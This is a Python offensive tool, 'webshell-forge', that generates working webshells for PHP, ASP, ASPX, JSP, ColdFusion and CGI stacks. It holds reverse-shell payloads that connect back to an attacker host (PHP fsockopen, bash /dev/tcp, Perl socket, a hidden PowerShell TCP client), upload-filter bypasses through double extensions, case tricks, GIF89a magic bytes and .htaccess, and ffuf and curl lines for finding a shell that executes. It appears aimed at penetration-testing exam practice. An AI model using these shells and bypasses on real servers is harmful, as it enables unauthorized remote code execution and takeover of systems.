#!/usr/bin/env python3
"""
webshell-forge.py  v1.1.0
Stack-aware webshell forge. Generates cmd + reverse shells for a given server
stack, clones them across every execute-able extension, and adds double-ext /
case / trailing-dot / magic-byte bypasses. Writes an ffuf wordlist to find which
extension actually executes.

Blocked on .php? The server may still run .phtml/.phar/.php5. IIS: .aspx/.ashx.
Tomcat: .jsp/.jspx. ColdFusion: .cfm. This stamps your payload into all of them.

stdlib only -- no pip, runs on a bare Kali/exam box.
Run with NO args (or -i) for interactive mode.

Examples:
  webshell-forge.py                              # interactive
  webshell-forge.py -s php                       # php cmd shell, all php exts
  webshell-forge.py -s php -t reverse --lport 443    # php reverse (tun0 auto LHOST)
  webshell-forge.py -s aspx -b -w                # IIS + bypasses + wordlist
  webshell-forge.py -p myshell.php -s php        # clone YOUR payload instead
  webshell-forge.py -s all -b -w -u http://$ip/uploads
"""
import argparse, os, sys, shutil, subprocess, re
from pathlib import Path
from types import SimpleNamespace

# ── STACK PROFILES: extensions each handler will execute ──────────────────────
PROFILES = {
    "php":  ["php", "php3", "php4", "php5", "php7", "phtml", "phar", "pht", "phps", "shtml"],
    "asp":  ["asp", "asa", "cer", "cdx"],
    "aspx": ["aspx", "ashx", "asmx", "asax", "ascx"],
    "jsp":  ["jsp", "jspx", "jspf", "jsw", "jsv", "war"],
    "cfm":  ["cfm", "cfml", "cfc"],
    "cgi":  ["cgi", "pl", "pm"],
}

# ── SHELL TEMPLATES: cmd (?c=) and reverse ({LHOST}/{LPORT}) per stack ─────────
# add a shell = add a template. missing reverse falls back to cmd + a helper.
SHELLS = {
    "php": {
        "cmd": '<?php system($_GET["c"]); ?>\n',
        "reverse": '<?php $s=@fsockopen("{LHOST}",{LPORT});'
                   '$p=proc_open("/bin/sh -i",array(0=>$s,1=>$s,2=>$s),$x); ?>\n',
    },
    "asp": {
        "cmd": '<% eval request("c") %>\n',
    },
    "aspx": {
        "cmd": '<%@ Page Language="Jscript"%><% eval(Request.Item["c"],"unsafe"); %>\n',
    },
    "jsp": {
        "cmd": '<% Runtime.getRuntime().exec(request.getParameter("c")); %>\n',
        "reverse": '<% Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",'
                   '"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"}); %>\n',
    },
    "cfm": {
        "cmd": '<cfexecute name="cmd.exe" arguments="/c #url.c#" timeout="10"></cfexecute>\n',
    },
    "cgi": {
        "cmd": '#!/usr/bin/perl\nprint "Content-type: text/html\\n\\n";'
               '\nuse CGI;system(CGI->new->param("c"));\n',
        "reverse": '#!/usr/bin/perl\nuse Socket;$i="{LHOST}";$p={LPORT};'
                   'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
                   'connect(S,sockaddr_in($p,inet_aton($i)));'
                   'open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");'
                   'exec("/bin/sh -i");\n',
    },
}
# PowerShell reverse one-liner to run THROUGH a cmd shell on Windows stacks:
PS_REV = ("powershell -nop -w hidden -c \"$c=New-Object Net.Sockets.TCPClient("
          "'{LHOST}',{LPORT});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
          "while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding)"
          ".GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write("
          "([text.encoding]::ASCII).GetBytes($r),0,$r.Length)}\"")

IMG_EXTS = ["jpg", "jpeg", "png", "gif"]
MAGIC = b"GIF89a;\n"   # content-sniff bypass; PHP ignores leading bytes


def col(t, code):
    return f"\033[{code}m{t}\033[0m" if sys.stdout.isatty() else t


def detect_lhost():
    """Best-effort tun0 IP (OSCP VPN), then default-route IP, else None."""
    for iface in ("tun0", "tap0"):
        try:
            out = subprocess.check_output(["ip", "-4", "addr", "show", iface],
                                          text=True, stderr=subprocess.DEVNULL)
            m = re.search(r"inet (\d+\.\d+\.\d+\.\d+)", out)
            if m:
                return m.group(1)
        except Exception:
            pass
    try:
        out = subprocess.check_output(["ip", "route", "get", "1.1.1.1"],
                                      text=True, stderr=subprocess.DEVNULL)
        m = re.search(r"src (\d+\.\d+\.\d+\.\d+)", out)
        if m:
            return m.group(1)
    except Exception:
        pass
    return None


def build_payload(args, stack):
    """Return (bytes, stem). -p file wins; else a generated cmd/reverse shell."""
    if args.payload:
        p = Path(args.payload)
        if not p.is_file():
            sys.exit(col(f"[!] payload not found: {p}", 31))
        return p.read_bytes(), p.stem

    lib = SHELLS.get(stack, {})
    want = args.type
    if want == "reverse" and "reverse" not in lib:
        # no native reverse for this stack -> cmd shell + PS helper printed later
        print(col(f"[!] no native reverse for {stack}; using cmd shell "
                  f"(run the PowerShell reverse through ?c=)", 33))
        want = "cmd"
    tmpl = lib.get(want) or lib["cmd"]
    tmpl = tmpl.replace("{LHOST}", args.lhost or "LHOST").replace("{LPORT}", str(args.lport))
    return tmpl.encode(), args.name


def bypass_names(stem, exts):
    names, primary = [], exts[:3]
    for e in primary:
        for img in IMG_EXTS:
            names.append(f"{stem}.{img}.{e}")
        names.append(f"{stem}.{e}.jpg")
    e0 = exts[0]
    names += [f"{stem}.{e0.upper()}", f"{stem}.{e0.capitalize()}",
              f"{stem}.{e0[:-1]}{e0[-1].upper()}", f"{stem}.{e0}."]
    return names


def forge(args):
    stacks = list(PROFILES) if args.stack == "all" else [args.stack]
    out = Path(args.out)
    if args.clean and out.exists():
        shutil.rmtree(out)
    out.mkdir(parents=True, exist_ok=True)

    print(col("=== webshell-forge v1.1.0 ===", 36))
    print(f"[*] stacks : {', '.join(stacks)}")
    print(f"[*] shell  : {'your file' if args.payload else args.type}"
          + (f"  ({args.lhost or 'LHOST'}:{args.lport})"
             if args.type == 'reverse' and not args.payload else ""))
    print(f"[*] outdir : {out}{'  (cleaned)' if args.clean else ''}")
    print(f"[*] magic  : {'GIF89a prepended' if args.magic else 'off'}")
    print()

    all_names = []
    for stack in stacks:
        exts = PROFILES[stack]
        data, stem = build_payload(args, stack)
        if args.magic:
            data = MAGIC + data
        print(col(f"[+] {stack}", 33))
        names = [f"{stem}.{e}" for e in exts]
        if args.bypass:
            names += bypass_names(stem, exts)
        for n in names:
            (out / n).write_bytes(data)
            all_names.append(n)
            print("    " + col("+", 32) + f" {n}")
        if args.bypass and stack == "php":
            (out / ".htaccess").write_text(f"AddType application/x-httpd-php .{stem}x\n")
            print("    " + col("+", 32) + f" .htaccess (upload too, then use .{stem}x)")

    seen, ordered = set(), []
    for n in all_names:
        if n not in seen:
            seen.add(n); ordered.append(n)
    if args.wordlist:
        (out / "shells.txt").write_text("\n".join(ordered) + "\n")
        print("\n" + col(f"[*] wrote {out}/shells.txt ({len(ordered)} names)", 36))

    print("\n" + col(f"[+] {len(all_names)} payloads written to {out}/", 36))

    # start a listener reminder for reverse shells
    if args.type == "reverse" and not args.payload:
        print("\n" + col("[>] catch it:", 33) + f"  nc -nlvp {args.lport}")
        if any("reverse" not in SHELLS.get(s, {}) for s in stacks):
            ps = PS_REV.replace("{LHOST}", args.lhost or "LHOST").replace("{LPORT}", str(args.lport))
            print(col("[>] Windows-stack reverse (run via ?c=):", 33))
            print("    " + ps)

    if args.url:
        stem0 = build_payload(args, stacks[0])[1]
        print("\n" + col("[>] find which extension executes:", 33))
        print("    " + col(f"ffuf -u {args.url}/FUZZ -w {out}/shells.txt -mc 200 -fs 0", 32))
        print(f"    confirm:  curl '{args.url}/{stem0}.{PROFILES[stacks[0]][0]}?c=id'")


# ── INTERACTIVE MODE ──────────────────────────────────────────────────────────
def ask(prompt, default=None, choices=None):
    d = f" [{default}]" if default is not None else ""
    while True:
        v = input(col(f"  {prompt}{d}: ", 36)).strip()
        if not v and default is not None:
            return default
        if choices and v and v not in choices:
            print(col(f"    choose one of: {', '.join(choices)}", 31)); continue
        if v or default is not None:
            return v


def yesno(prompt, default=False):
    d = "Y/n" if default else "y/N"
    v = input(col(f"  {prompt} ({d}): ", 36)).strip().lower()
    if not v:
        return default
    return v.startswith("y")


def interactive():
    print(col("=== webshell-forge :: interactive ===", 36))
    a = SimpleNamespace(payload=None, clean=False)
    a.stack = ask("stack", "php", list(PROFILES) + ["all"])
    a.type = ask("shell type", "cmd", ["cmd", "reverse"])
    a.lhost, a.lport = None, 443
    if a.type == "reverse":
        auto = detect_lhost()
        a.lhost = ask("LHOST", auto or "") or (auto or "LHOST")
        a.lport = int(ask("LPORT", "443") or "443")
    own = ask("use your own payload file? (path, blank=generate)", "")
    if own:
        a.payload = own
    a.name = ask("base filename stem", "shell")
    a.out = ask("output dir", "./shells")
    a.bypass = yesno("add bypass variants (double-ext/case/trailing)?", False)
    a.magic = yesno("prepend GIF89a magic bytes?", False)
    a.wordlist = yesno("write shells.txt wordlist?", True)
    a.url = ask("target upload URL for ffuf line (blank=skip)", "") or None
    a.clean = yesno("wipe output dir first?", False)
    print()
    forge(a)


def main():
    ap = argparse.ArgumentParser(
        description="Stack-aware webshell forge -- generates & clones shells (stdlib only).",
        formatter_class=argparse.RawDescriptionHelpFormatter, epilog=__doc__)
    ap.add_argument("-i", "--interactive", action="store_true", help="menu-driven mode")
    ap.add_argument("-p", "--payload", help="your own payload file (overrides generated shell)")
    ap.add_argument("-s", "--stack", default="php", choices=list(PROFILES) + ["all"],
                    help="server stack (default: php)")
    ap.add_argument("-t", "--type", default="cmd", choices=["cmd", "reverse"],
                    help="generated shell type (default: cmd)")
    ap.add_argument("--lhost", help="reverse-shell callback IP (default: auto-detect tun0)")
    ap.add_argument("--lport", type=int, default=443, help="reverse-shell port (default: 443)")
    ap.add_argument("-o", "--out", default="./shells", help="output dir (default: ./shells)")
    ap.add_argument("-n", "--name", default="shell", help="base filename stem (default: shell)")
    ap.add_argument("-b", "--bypass", action="store_true", help="add double-ext/case/trailing bypasses")
    ap.add_argument("-m", "--magic", action="store_true", help="prepend GIF89a magic bytes")
    ap.add_argument("-w", "--wordlist", action="store_true", help="write shells.txt for ffuf")
    ap.add_argument("-u", "--url", help="print ffuf line against URL/FUZZ")
    ap.add_argument("--clean", action="store_true", help="wipe outdir before writing")

    # no args at all -> interactive
    if len(sys.argv) == 1:
        return interactive()
    args = ap.parse_args()
    if args.interactive:
        return interactive()
    if args.type == "reverse" and not args.lhost and not args.payload:
        args.lhost = detect_lhost()
    forge(args)


if __name__ == "__main__":
    main()
